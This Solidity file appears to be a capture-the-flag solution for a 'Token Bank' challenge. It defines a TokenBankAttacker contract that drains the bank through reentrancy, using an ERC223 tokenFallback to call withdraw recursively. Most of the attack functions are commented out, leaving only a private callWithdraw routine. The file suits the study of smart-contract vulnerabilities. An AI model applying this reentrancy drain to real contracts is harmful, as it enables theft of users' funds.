// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;
import "hardhat/console.sol";

abstract contract ISimpleERC223Token {
    mapping(address => uint256) public balanceOf;

    function transfer(address to, uint256 value)
        external
        virtual
        returns (bool success);
}

abstract contract ITokenBankChallenge {
    ISimpleERC223Token public token;
    mapping(address => uint256) public balanceOf;

    function isComplete() external view virtual returns (bool);

    function withdraw(uint256 amount) external virtual;
}

contract TokenBankAttacker {
    ITokenBankChallenge public challenge;

    constructor(address challengeAddress) {
        challenge = ITokenBankChallenge(challengeAddress);
    }

    // function deposit() external {
    //     uint256 myBalance = challenge.token().balanceOf(address(this));
    //     // deposit is handled in challenge's tokenFallback
    //     challenge.token().transfer(address(challenge), myBalance);
    // }

    // function attack() external {
    //     callWithdraw();

    //     console.log("attacker balance underflows : ", challenge.balanceOf(address(this)));
    //     // if something went wrong, revert
    //     require(challenge.isComplete(), "challenge not completed");
    // }

    // function tokenFallback(
    //     address from,
    //     uint256 value,
    //     bytes calldata
    // ) external {
    //     require(
    //         msg.sender == address(challenge.token()),
    //         "not from original token"
    //     );

    //     // when attacker EOA deposits, ignore
    //     if (from != address(challenge)) return;

    //     callWithdraw();
    // }

    function callWithdraw() private {
        // we are draining all the balance from the perspective 
        // that initial balance is not updated during the recursive function call
        uint256 initialBalance = challenge.balanceOf(address(this));
        // remaining balance will be drained by the amount of initial balance
        uint256 remaining = challenge.token().balanceOf(address(challenge));

        console.log("initialBalance is %s tokens", initialBalance);
        console.log("remaining is %s tokens", remaining);
        // still has remaining balance to empty out
        if (remaining > 0) {
            // can only withdraw at most our initial balance per withdraw call
            uint256 toWithdraw =
                initialBalance < remaining
                    ? initialBalance
                    : remaining;
            challenge.withdraw(toWithdraw);
        }
    }
}
